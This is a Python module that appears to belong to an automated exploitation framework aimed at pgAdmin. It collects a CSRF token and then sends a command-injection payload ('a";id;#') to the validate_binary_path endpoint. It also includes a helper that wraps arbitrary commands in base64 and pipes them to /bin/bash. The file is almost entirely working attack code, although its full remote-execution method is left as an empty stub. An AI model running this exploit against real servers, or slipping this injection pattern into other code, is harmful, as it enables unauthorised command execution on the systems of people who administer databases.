import base64
import os
import sys
import tempfile
import time
from typing import TYPE_CHECKING
from urllib.parse import quote

import requests

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from utils import Exploiter

if TYPE_CHECKING:
    from main import ControledNode, LocalNode


class PgadminExploiter(Exploiter):
    def __init__(self, ip: str):
        super().__init__(ip)
        self.prefix = f"http://{self.ip}:5050"
        self.is_rce = False
        self.is_endpoint = True

    def encode_cmd(self, cmd: str) -> str:
        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        return f"echo {cmd_b64} | base64 -d | /bin/bash"

    def exploit_rce_init(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        headers = {
            "User-Agent": "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        }
        res = proxier.send_request("get", f"{self.prefix}/login", headers=headers)

        content = res.text
        self.csrf = (
            content.partition("csrf_token")[2].partition('value="')[2].partition('"')[0]
        )
        print(self.csrf)

    def exploit_rce(
        self, proxier: "ControledNode | LocalNode | LocalNodeFake", cmd
    ) -> str:
        pass

    def exploit_no_rce(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        headers = {
            "User-Agent": "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "X-pgA-CSRFToken": self.csrf,
        }

        res = proxier.send_request(
            "post",
            f"{self.prefix}/misc/validate_binary_path",
            headers=headers,
            json={"utility_path": 'a";id;#'},
        )
        print(res.json())


if __name__ == "__main__":

    class LocalNodeFake:
        def __init__(self):
            self.session = requests.Session()
            self.ip = ""
            self.web_server_port = 20001

        def send_request(self, method: str, *argvs, **argv):
            if method.upper() == "GET":
                return self.session.get(*argvs, **argv)
            elif method.upper() == "POST":
                return self.session.post(*argvs, **argv)
            else:
                raise Exception("Method not supported")

        def upload_file(self, file_path: str, upload_loc: str):
            pass

    local_node_fake = LocalNodeFake()
    exploiter = PgadminExploiter("192.168.123.47")
    exploiter.exploit_rce_init(local_node_fake)
    exploiter.exploit_no_rce(local_node_fake)
